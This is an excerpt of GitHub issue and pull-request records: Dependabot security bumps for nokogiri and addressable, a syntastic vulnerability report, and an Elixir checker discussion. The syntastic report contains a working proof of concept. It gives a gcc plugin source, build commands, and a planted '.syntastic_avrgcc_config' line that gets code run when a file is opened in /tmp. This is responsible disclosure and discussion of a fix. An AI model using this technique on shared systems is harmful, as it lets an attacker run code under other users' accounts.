the security policy followed by Nokogiri maintainers, which is to treat all input
as <strong>untrusted</strong> by default whenever possible.</p>
<p>Please note that this security
fix was pushed into a new minor version, 1.11.x, rather than a patch release to
the 1.10.x branch, because it is a breaking change for some schemas and the risk
was assessed to be &quot;Low Severity&quot;.</p>
<h3>Affected Versions</h3>
<p>Nokogiri <code>&amp;lt;= 1.10.10</code> as well as prereleases <code>1.11.0.rc1</code>, <code>1.11.0.rc2</code>, and <code>1.11.0.rc3</code></p>
<h3>Mitigation</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: &gt;= 1.11.0.rc4
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-7rrm-v45f-jp64"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Update packaged dependency libxml2 from 2.9.10 to 2.9.12</strong></p>
<h3>Summary</h3>
<p>Nokogiri v1.11.4 updates the vendored libxml2 from v2.9.10 to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a> (Medium severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a> (Low severity)</li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a> (Low severity)</li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see #1992).</p>
<p>Please note that this advisory only applies to the CRuby implementation of Nokogiri <code>&amp;lt; 1.11.4</code>, and only if the packaged version of libxml2 is being used. If you've overridden defaults at installation time to use system libraries instead of packaged libraries, you should instead pay attention to your distro's <code>libxml2</code> release announcements.</p>
<h3>Mitigation</h3>
<p>Upgrade to Nokogiri <code>&amp;gt;= 1.11.4</code>.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 1.11.4</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/sparklemotion/nokogiri/releases"">nokogiri's releases</a>.</em></p>
<blockquote>
<h2>1.11.4 / 2021-05-14</h2>
<h3>Security</h3>
<p>[CRuby] Vendored libxml2 upgraded to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a></li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a></li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1992"">#1992</a>).</p>
<p>Please see <a href=""https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-7rrm-v45f-jp64"">nokogiri/GHSA-7rrm-v45f-jp64 </a> or <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2233"">#2233</a> for a more complete analysis of these CVEs and patches.</p>
<h3>Dependencies</h3>
<ul>
<li>[CRuby] vendored libxml2 is updated from 2.9.10 to 2.9.12. (Note that 2.9.11 was skipped because it was superseded by 2.9.12 a few hours after its release.)</li>
</ul>
<h2>1.11.3 / 2021-04-07</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this likely segfaulted. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1900"">#1900</a>]</li>
<li>[JRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this raised a <code>TypeError</code> exception.</li>
<li>[CRuby] arm64/aarch64 systems (like Apple's M1) can now compile libxml2 and libxslt from source (though we continue to strongly advise users to install the native gems for the best possible experience)</li>
</ul>
<h2>1.11.2 / 2021-03-11</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] <code>NodeSet</code> may now safely contain <code>Node</code> objects from multiple documents. Previously the GC lifecycle of the parent <code>Document</code> objects could lead to nodes being GCed while still in scope. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1952#issuecomment-770856928"">#1952</a>]</li>
<li>[CRuby] Patch libxml2 to avoid &quot;huge input lookup&quot; errors on large CDATA elements. (See upstream <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/issues/200"">GNOME/libxml2#200</a> and <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/100"">GNOME/libxml2!100</a>.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2132"">#2132</a>].</li>
<li>[CRuby+Windows] Enable Nokogumbo (and other downstream gems) to compile and link against <code>nokogiri.so</code> by including <code>LDFLAGS</code> in <code>Nokogiri::VERSION_INFO</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2167"">#2167</a>]</li>
<li>[CRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was invoked twice on each object.</li>
<li>[JRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was not called, which was a problem for subclassing such as done by <code>Loofah</code>.</li>
</ul>
<h3>Improved</h3>
<ul>
<li>Reduce the number of object allocations needed when parsing an HTML::DocumentFragment. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2087"">#2087</a>] (Thanks, <a href=""https://github.com/ashmaroli""><code>@â€‹ashmaroli</code></a>!)</li>
<li>[JRuby] Update the algorithm used to calculate <code>Node#line</code> to be wrong less-often. The underlying parser, Xerces, does not track line numbers, and so we've always used a hacky solution for this method. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1223"">#1223</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2177"">#2177</a>]</li>
<li>Introduce <code>--enable-system-libraries</code> and <code>--disable-system-libraries</code> flags to <code>extconf.rb</code>. These flags provide the same functionality as <code>--use-system-libraries</code> and the <code>NOKOGIRI_USE_SYSTEM_LIBRARIES</code> environment variable, but are more idiomatic. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@â€‹eregon</code></a>!)</li>
<li>[TruffleRuby] <code>--disable-static</code> is now the default on TruffleRuby when the packaged libraries are used. This is more flexible and compiles faster. (Note, though, that the default on TR is still to use system libraries.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2191#issuecomment-780724627"">#2191</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@â€‹eregon</code></a>!)</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/sparklemotion/nokogiri/blob/main/CHANGELOG.md"">nokogiri's changelog</a>.</em></p>
<blockquote>
<h2>1.11.4 / 2021-05-14</h2>
<h3>Security</h3>
<p>[CRuby] Vendored libxml2 upgraded to v2.9.12 which addresses:</p>
<ul>
<li><a href=""https://security.archlinux.org/CVE-2019-20388"">CVE-2019-20388</a></li>
<li><a href=""https://security.archlinux.org/CVE-2020-24977"">CVE-2020-24977</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3517"">CVE-2021-3517</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3518"">CVE-2021-3518</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3537"">CVE-2021-3537</a></li>
<li><a href=""https://security.archlinux.org/CVE-2021-3541"">CVE-2021-3541</a></li>
</ul>
<p>Note that two additional CVEs were addressed upstream but are not relevant to this release. <a href=""https://security.archlinux.org/CVE-2021-3516"">CVE-2021-3516</a> via <code>xmllint</code> is not present in Nokogiri, and <a href=""https://security.archlinux.org/CVE-2020-7595"">CVE-2020-7595</a> has been patched in Nokogiri since v1.10.8 (see <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1992"">#1992</a>).</p>
<p>Please see <a href=""https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-7rrm-v45f-jp64"">nokogiri/GHSA-7rrm-v45f-jp64 </a> or <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2233"">#2233</a> for a more complete analysis of these CVEs and patches.</p>
<h3>Dependencies</h3>
<ul>
<li>[CRuby] vendored libxml2 is updated from 2.9.10 to 2.9.12. (Note that 2.9.11 was skipped because it was superseded by 2.9.12 a few hours after its release.)</li>
</ul>
<h2>1.11.3 / 2021-04-07</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this likely segfaulted. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1900"">#1900</a>]</li>
<li>[JRuby] Passing non-<code>Node</code> objects to <code>Document#root=</code> now raises an <code>ArgumentError</code> exception. Previously this raised a <code>TypeError</code> exception.</li>
<li>[CRuby] arm64/aarch64 systems (like Apple's M1) can now compile libxml2 and libxslt from source (though we continue to strongly advise users to install the native gems for the best possible experience)</li>
</ul>
<h2>1.11.2 / 2021-03-11</h2>
<h3>Fixed</h3>
<ul>
<li>[CRuby] <code>NodeSet</code> may now safely contain <code>Node</code> objects from multiple documents. Previously the GC lifecycle of the parent <code>Document</code> objects could lead to nodes being GCed while still in scope. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1952#issuecomment-770856928"">#1952</a>]</li>
<li>[CRuby] Patch libxml2 to avoid &quot;huge input lookup&quot; errors on large CDATA elements. (See upstream <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/issues/200"">GNOME/libxml2#200</a> and <a href=""https://gitlab.gnome.org/GNOME/libxml2/-/merge_requests/100"">GNOME/libxml2!100</a>.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2132"">#2132</a>].</li>
<li>[CRuby+Windows] Enable Nokogumbo (and other downstream gems) to compile and link against <code>nokogiri.so</code> by including <code>LDFLAGS</code> in <code>Nokogiri::VERSION_INFO</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2167"">#2167</a>]</li>
<li>[CRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was invoked twice on each object.</li>
<li>[JRuby] <code>{XML,HTML}::Document.parse</code> now invokes <code>#initialize</code> exactly once. Previously <code>#initialize</code> was not called, which was a problem for subclassing such as done by <code>Loofah</code>.</li>
</ul>
<h3>Improved</h3>
<ul>
<li>Reduce the number of object allocations needed when parsing an <code>HTML::DocumentFragment</code>. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2087"">#2087</a>] (Thanks, <a href=""https://github.com/ashmaroli""><code>@â€‹ashmaroli</code></a>!)</li>
<li>[JRuby] Update the algorithm used to calculate <code>Node#line</code> to be wrong less-often. The underlying parser, Xerces, does not track line numbers, and so we've always used a hacky solution for this method. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/1223"">#1223</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2177"">#2177</a>]</li>
<li>Introduce <code>--enable-system-libraries</code> and <code>--disable-system-libraries</code> flags to <code>extconf.rb</code>. These flags provide the same functionality as <code>--use-system-libraries</code> and the <code>NOKOGIRI_USE_SYSTEM_LIBRARIES</code> environment variable, but are more idiomatic. [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@â€‹eregon</code></a>!)</li>
<li>[TruffleRuby] <code>--disable-static</code> is now the default on TruffleRuby when the packaged libraries are used. This is more flexible and compiles faster. (Note, though, that the default on TR is still to use system libraries.) [<a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2191#issuecomment-780724627"">#2191</a>, <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2193"">#2193</a>] (Thanks, <a href=""https://github.com/eregon""><code>@â€‹eregon</code></a>!)</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9d69b44ed3357b8069856083d39ee418cd10109b""><code>9d69b44</code></a> version bump to v1.11.4</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/058e87fdfda2cc2f309df098d18fe8856e785fcc""><code>058e87f</code></a> update CHANGELOG with complete CVE information</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/92852514a0d4621961deb6ce249441ff5140358f""><code>9285251</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sparklemotion/nokogiri/issues/2234"">#2234</a> from sparklemotion/2233-upgrade-to-libxml-2-9-12</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/5436f6120f883e9f185d48b992f39118a4897760""><code>5436f61</code></a> update CHANGELOG</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/761d320af2872c61b91f7b147cf57481566e3c67""><code>761d320</code></a> patch: renumber libxml2 patches</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/889ee2a9cb1e190bfa664cbf3552585f4d0a09a7""><code>889ee2a</code></a> test: update behavior of namespaces in HTML</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9751d852c005606447dac7bb17f1a56593014583""><code>9751d85</code></a> test: remove low-value HTML::SAX::PushParser encoding test</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/9fcb7d25eabfab5e701d882e72ecab3b2ea6b13c""><code>9fcb7d2</code></a> test: adjust xpath gc test to libxml2's max recursion depth</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/1c99019f5f1bee23e4bff6cf72871f470097f7b2""><code>1c99019</code></a> patch: backport libxslt configure.ac change for libxml2 config</li>
<li><a href=""https://github.com/sparklemotion/nokogiri/commit/82a253fe7c5bdfab5fbe4c1b0c536b5ce4c72ac3""><code>82a253f</code></a> patch: fix isnan/isinf patch to apply cleanly to libxml 2.9.12</li>
<li>Additional commits viewable in <a href=""https://github.com/sparklemotion/nokogiri/compare/v1.10.10...v1.11.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=nokogiri&package-manager=bundler&previous-version=1.10.10&new-version=1.11.4)](https://dependabot.com/compatibility-score/?dependency-name=nokogiri&package-manager=bundler&previous-version=1.10.10&new-version=1.11.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,942285018,"[Security] Bump addressable from 2.7.0 to 2.8.0","Bumps [addressable](https://github.com/sporkmonger/addressable) from 2.7.0 to 2.8.0. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jxhc-q857-3j6g"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Regular Expression Denial of Service in Addressable templates</strong></p>
<h3>Impact</h3>
<p>Within the URI template implementation in Addressable, a maliciously crafted template may result in uncontrolled resource consumption, leading to denial of service when matched against a URI. In typical usage, templates would not normally be read from untrusted user input, but nonetheless, no previous security advisory for Addressable has cautioned against doing this. Users of the parsing capabilities in Addressable but not the URI template capabilities are unaffected.</p>
<h3>Patches</h3>
<p>The vulnerability was introduced in version 2.3.0 (previously yanked) and has been present in all subsequent versions up to, and including, 2.7.0. It is fixed in version 2.8.0.</p>
<h3>Workarounds</h3>
<p>The vulnerability can be avoided by only creating Template objects from trusted sources that have been validated not to produce catastrophic backtracking.</p>
<h3>References</h3>
<ul>
<li><a href=""https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></li>
<li><a href=""https://cwe.mitre.org/data/definitions/1333.html"">https://cwe.mitre.org/data/definitions/1333.html</a></li>
<li><a href=""https://www.regular-expressions.info/catastrophic.html"">https://www.regular-expressions.info/catastrophic.html</a></li>
</ul>
<h3>For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt; 2.3.0, &lt;= 2.7.0</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/sporkmonger/addressable/blob/main/CHANGELOG.md"">addressable's changelog</a>.</em></p>
<blockquote>
<h1>Addressable 2.8.0</h1>
<ul>
<li>fixes ReDoS vulnerability in Addressable::Template#match</li>
<li>no longer replaces <code>+</code> with spaces in queries for non-http(s) schemes</li>
<li>fixed encoding ipv6 literals</li>
<li>the <code>:compacted</code> flag for <code>normalized_query</code> now dedupes parameters</li>
<li>fix broken <code>escape_component</code> alias</li>
<li>dropping support for Ruby 2.0 and 2.1</li>
<li>adding Ruby 3.0 compatibility for development tasks</li>
<li>drop support for <code>rack-mount</code> and remove Addressable::Template#generate</li>
<li>performance improvements</li>
<li>switch CI/CD to GitHub Actions</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/sporkmonger/addressable/commit/6469a232c0f1892809ff66737370c765d574e16c""><code>6469a23</code></a> Updating gemspec again</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/24336385de0261571b3adaad0431459edb420c79""><code>2433638</code></a> Merge branch 'main' of github.com:sporkmonger/addressable into main</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/e9c76b889789c75d7073c17b0ab557635d3f6704""><code>e9c76b8</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sporkmonger/addressable/issues/378"">#378</a> from ashmaroli/flat-map</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/56c5cf7ece9223ff4240e07078cc26d3adbbbd30""><code>56c5cf7</code></a> Update the gemspec</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/c1fed1ca0a44c448e74d761fd44ed94869199807""><code>c1fed1c</code></a> Require a non-vulnerable rake</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/0d8a3127e35886ce9284810a7f2438bff6b43cbc""><code>0d8a312</code></a> Adding note about ReDoS vulnerability</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/89c76130ce255c601f642a018cb5fb5a80e679a7""><code>89c7613</code></a> Merge branch 'template-regexp' into main</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/cf8884f815c96b646c796f707bf768cf6eb65543""><code>cf8884f</code></a> Note about alias fix</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/bb03f7112e8e478240a0f96e1cc7428159b41586""><code>bb03f71</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/sporkmonger/addressable/issues/371"">#371</a> from charleystran/add_missing_encode_component_doc_entry</li>
<li><a href=""https://github.com/sporkmonger/addressable/commit/6d1d8094a66cbf932ecf69db6850bc9edaf86de0""><code>6d1d809</code></a> Adding note about :compacted normalization</li>
<li>Additional commits viewable in <a href=""https://github.com/sporkmonger/addressable/compare/addressable-2.7.0...addressable-2.8.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=addressable&package-manager=bundler&previous-version=2.7.0&new-version=2.8.0)](https://dependabot.com/compatibility-score/?dependency-name=addressable&package-manager=bundler&previous-version=2.7.0&new-version=2.8.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
vim-syntastic/syntastic,314748702,"Checker config files allow arbitrary code execution scenarios","Hi, 

I'm the Debian maintainer of vim-syntastic and I received this bug report:

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894736

Package: vim-syntastic
Version: 3.8.0-1
Severity: serious

Hello,

syntastic has a Configuration Files[1] feature enabled for several
checkers, where:

  a configuration file is looked up in the directory of the file being
  checked, then upwards in parent directories.  The search stops either
  when a file with the right name is found, or when the root of the
  filesystem is reached.[1]

[1] https://github.com/vim-syntastic/syntastic/blob/master/doc/syntastic-checkers.txt#L7744

Each line found in the configuration file is escaped as a single
argument and appended to the checker command being run.

I am not an expert on the various possibly dangerous command line
options of all possible checkers, but I played with one I knew how to
play with, and what follows is a possible attack. There might be easier
attacks on checkers that are enabled by default, since the configuration
files features, as it is now, leaves a pretty wide attack surface open.

## Step 1: a malicious gcc plugin

The source code:

```
  #include <gcc-plugin.h>
  #include <stdio.h>
  
  int plugin_is_GPL_compatible;
  
  int plugin_init(struct plugin_name_args   *info,  /* Argument infor */
          struct plugin_gcc_version *ver)   /* Version of GCC */
  {
      fprintf(stdout, ""hello\n"");
      FILE* out = fopen(""/tmp/test"", ""wt"");
      fprintf(out, ""arbitrary code execution\n"");
      fclose(out);
  };
```
Building the plugin:

```
$ gcc -I$(gcc -print-file-name=plugin)/include -fPIC -fno-rtti -O2 -shared plugin.cc  -o /tmp/plugin.so
```

Installing the plugin as nobody.nogroup in /tmp:

```
$ sudo chown nobody.nogroup /tmp/plugin.so
```

## Step 2: a syntastic config file

```
echo -fplugin=/tmp/plugin.so > /tmp/.syntastic_avrgcc_config
sudo chown nobody.nogroup /tmp/.syntastic_avrgcc_config
```

## Step 3: enable the avrgcc plugin

```
let g:syntastic_cpp_checkers = ['avrgcc']
```

## Step 4: edit a C++ file in /tmp

```
touch /tmp/foo.cc
vim /tmp/foo.cc
```

## Step 5: cry

```
$ cat /tmp/test
arbitrary code execution
```
# What should be different

There are several steps that can avoid this:

1. allow to disable this feature, and ship with this feature disabled by
   default
2. stop recursing upwards when hitting a directory that's writable by
   someone other than the current user
3. check that the config files are owned by the current user


# Mitigation

I am not a vimscript expert, and unfortunately I have not found a way to
disable this behaviour without editing the syntastic config files.

------

It works.
What do you think about it?","This assumes the attacker has write access to a parent directory to the base directory of the project you're checking.  Consequently the impact should be pretty low on usual setups.

The root of the problem seems to be that the name of the configuration file can be predicted.  Thus a possible mitigation is to set the appropriate `g:syntastic_<filetype>_config_file` or `g:syntastic_<checker>_config_file` to non-default names for all the checkers that support configuration files.

A more permanent solution would be to unset the defaults for these variables, and possible do some checks on the directories and the file itself as you suggest.  This should disable the feature by default, and force the user to choose a name of the configuration file.  I'll make a new release soon with these changes.I released [3.9.0][3.9.0] with the first part of the fix I mentioned above, clearing the defaults for the names of the configuration files.

Sadly Vim has no built-in way of finding the owner of a file, presumably for historic reasons (most of the OSes Vim was written for at the beginning had no useful concept of ownership).  There is also no good way to check whether a directory is writable by someone other than the current user.  It might be possible to work around these limitations with Python extensions, but syntastic doesn't assume (or make use of) such extensions.  Consequently, the solution in 3.9.0, while probably good enough to stop the attack described in the OP, is less than satisfactory.  A better solution would involve adding the relevant functions to Vim.

[3.9.0]: https://github.com/vim-syntastic/syntastic/releases/tag/3.9.0This issue was assigned CVE-2018-11319",no,"security,"
vim-syntastic/syntastic,37979451,"Elixir checker executes code","The Elixir syntax checker executes any program it checks. For example:

``` elixir
# sleeper.exs
sleeper = fn -> :timer.sleep(4_000) end
sleeper.()
```

It takes 4 seconds to save this file because the `sleeper` function is executed.

This method of checking is dangerous; for example, suppose it were a script to delete files? Also it's annoying; if you accidentally create infinite recursion, Vim will hang.

Can we check syntax without executing the code?

(The answer may be ""only in a limited way"": see [this thread](https://groups.google.com/d/msg/elixir-lang-talk/B29noPHvQ-8/9JvSGPop7n0J))
","I'm afraid I barely know what Elixir is, let alone how it works. :) You guys will have to sort it out, and let me know what is the preferred incantation to make it work, and if it's safe to use.  In the mean time, I can only offer the same treatment I applied to perl: #1013.  Sorry about that.
Done in 1d19dff.  Set `g:syntastic_enable_elixir_checker` to 1 in your vimrc to re-enable the checker.
No problem. :) I'm quite new to it myself and was just trying to figure out why it killed my editor.

Maybe when I know more, I can offer an alternate approach.
Any update on this issue?
@alxndr It's an Elixir issue, not a syntastic one.  Or, put another way: if anybody has figured out yet how to make Elixir run syntactic checks without also executing the code being checked, they didn't bother to tell me about it.  Thus, no progress so far.
Gotcha, thanks!
I'm not much of an elixir expert, but can't we just change the makeprg to `elixirc`, which compiles the code instead of running it? I tried it, and it seems to work for me.
> can't we just change the makeprg to  elixirc , which compiles the code instead of running it?

Actually, `elixirc` is just a [script](https://github.com/elixir-lang/elixir/blob/master/bin/elixirc) around `elixir`.  It doesn't solve any security problem, and it adds a problem of its own.  But you can still use it without code changes if you insist (cf. #1343).
Ah, I found [this security issue raised on the Elixir project](https://github.com/elixir-lang/elixir/issues/3282) where JosÃ© himself describes how to approach syntax error detection. Looks like Elixir can easily parse its own code, so it should be possible to have the syntastic checker bundle in an Elixir script to safely do this. Here's a first attempt at such a script, which prints syntax errors but doesn't properly handle I/O errors:

``` elixir
[path | _] = System.argv()
{:ok, file} = File.open(path)
data = IO.read(file, :all)
code = Code.string_to_quoted data
case code do
  {:ok, _} -> :ok
  {:error, {line, error, token}} -> IO.puts ""#{path}:#{line}:#{error}#{token}""
end
```

I tested it on ""hello world"" and it doesn't execute the code.

Would it be weird to bundle a script like this in syntastic? If not, can someone point me to an example of where the script should go and how I set `makeprg` to the correct path?
> Would it be weird to bundle a script like this in syntastic?

